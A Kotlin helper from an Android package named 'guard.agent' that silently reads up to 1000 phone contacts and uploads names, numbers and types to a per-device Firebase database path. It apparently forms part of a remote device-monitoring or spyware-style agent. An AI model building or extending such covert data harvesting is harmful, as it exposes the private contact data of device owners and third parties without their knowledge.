package com.guard.agent.helpers.data

import android.content.Context
import android.provider.ContactsContract
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger

object ContactsHelper {

    private const val TAG = "ContactsHelper"
    private const val MAX_CONTACTS = 1000

    fun push(ctx: Context, deviceKey: String) {
        try {
            val list = mutableListOf<Map<String, Any>>()
            val cursor = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )

            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                val typeIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)

                while (it.moveToNext() && list.size < MAX_CONTACTS) {
                    val name = it.getString(nameIdx) ?: "Unknown"
                    val number = it.getString(numIdx) ?: continue
                    val type = it.getInt(typeIdx)
                    list.add(
                        mapOf(
                            "name" to name,
                            "number" to number,
                            "type" to type
                        )
                    )
                }
            }

            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_CONTACTS)
                .setValue(
                    mapOf(
                        "count" to list.size,
                        "list" to list,
                        "time" to System.currentTimeMillis()
                    )
                )

            Logger.d(TAG, "Pushed ${list.size} contacts")
        } catch (e: Exception) {
            Logger.e(TAG, "push failed", e)
        }
    }
}
